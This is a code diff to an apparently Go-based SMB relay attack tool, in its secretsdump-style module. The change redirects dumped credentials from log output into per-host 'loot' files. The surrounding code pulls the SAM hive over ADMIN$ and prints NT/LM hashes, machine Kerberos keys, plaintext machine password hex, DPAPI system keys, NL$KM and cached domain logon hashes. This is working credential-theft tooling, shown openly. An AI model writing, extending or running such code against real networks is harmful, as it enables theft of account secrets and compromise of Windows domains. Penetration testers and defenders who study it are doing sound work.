@@ -113,6 +113,9 @@ func secretsdumpAttack(client *SMBRelayClient, cfg *Config) error {
 	if samTempFile != "" {
 		log.Printf("[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)")
 
+		openDumpLoot(cfg, hostFromAddr(client.TargetAddr), "secretsdump")
+		defer closeDumpLoot()
+
 		samData, err := client.DownloadFile("ADMIN$", "Temp\\"+samTempFile)
 		if err != nil {
 			log.Printf("[-] Failed to download SAM hive: %v", err)
@@ -128,7 +131,7 @@ func secretsdumpAttack(client *SMBRelayClient, cfg *Config) error {
 					for _, user := range users {
 						lmHash := hex.EncodeToString(user.LMHash)
 						ntHash := hex.EncodeToString(user.NTHash)
-						log.Printf("%s:%d:%s:%s:::", user.Username, user.RID, lmHash, ntHash)
+						dumpResultf("%s:%d:%s:%s:::", user.Username, user.RID, lmHash, ntHash)
 					}
 				}
 			}
@@ -303,29 +306,29 @@ func dumpLSASecretsFromHive(secHive *registry.Hive, bootKey []byte, domainInfo *
 				getDomainDNS(domainInfo), computerName)
 
 			if machineKeys.AES256Key != nil {
-				log.Printf("%s:aes256-cts-hmac-sha1-96:%s", prefix, hex.EncodeToString(machineKeys.AES256Key))
+				dumpResultf("%s:aes256-cts-hmac-sha1-96:%s", prefix, hex.EncodeToString(machineKeys.AES256Key))
 			}
 			if machineKeys.AES128Key != nil {
-				log.Printf("%s:aes128-cts-hmac-sha1-96:%s", prefix, hex.EncodeToString(machineKeys.AES128Key))
+				dumpResultf("%s:aes128-cts-hmac-sha1-96:%s", prefix, hex.EncodeToString(machineKeys.AES128Key))
 			}
 			if machineKeys.DESKey != nil {
-				log.Printf("%s:des-cbc-md5:%s", prefix, hex.EncodeToString(machineKeys.DESKey))
+				dumpResultf("%s:des-cbc-md5:%s", prefix, hex.EncodeToString(machineKeys.DESKey))
 			}
-			log.Printf("%s:plain_password_hex:%s", prefix, hex.EncodeToString(secret.Value))
+			dumpResultf("%s:plain_password_hex:%s", prefix, hex.EncodeToString(secret.Value))
 			if machineKeys.NTHash != nil {
-				log.Printf("%s:aad3b435b51404eeaad3b435b51404ee:%s:::", prefix, hex.EncodeToString(machineKeys.NTHash))
+				dumpResultf("%s:aad3b435b51404eeaad3b435b51404ee:%s:::", prefix, hex.EncodeToString(machineKeys.NTHash))
 			}
 		} else if secret.Name == "DPAPI_SYSTEM" {
 			keys := registry.ParseDPAPISecret(secret.Value)
 			if keys != nil {
-				log.Printf("dpapi_machinekey:0x%s", hex.EncodeToString(keys.MachineKey))
-				log.Printf("dpapi_userkey:0x%s", hex.EncodeToString(keys.UserKey))
+				dumpResultf("dpapi_machinekey:0x%s", hex.EncodeToString(keys.MachineKey))
+				dumpResultf("dpapi_userkey:0x%s", hex.EncodeToString(keys.UserKey))
 			}
 		} else if secret.Name == "NL$KM" {
-			log.Printf("NL$KM:%s", hex.EncodeToString(secret.Value))
+			dumpResultf("NL$KM:%s", hex.EncodeToString(secret.Value))
 		} else {
 			log.Printf("[*] %s", secret.Name)
-			log.Printf("    %s", hex.EncodeToString(secret.Value))
+			dumpResultf("    %s", hex.EncodeToString(secret.Value))
 		}
 	}
 }
@@ -342,7 +345,7 @@ func dumpCachedCredsFromHive(secHive *registry.Hive, bootKey []byte) {
 		log.Printf("[*] Dumping cached domain logon information (domain/username:hash)")
 		for _, cred := range cachedCreds {
 			if cred.Username != "" {
-				log.Printf("%s/%s:%s", cred.Domain, cred.Username, hex.EncodeToString(cred.EncryptedHash))
+				dumpResultf("%s/%s:%s", cred.Domain, cred.Username, hex.EncodeToString(cred.EncryptedHash))
 			}
 		}
 	}
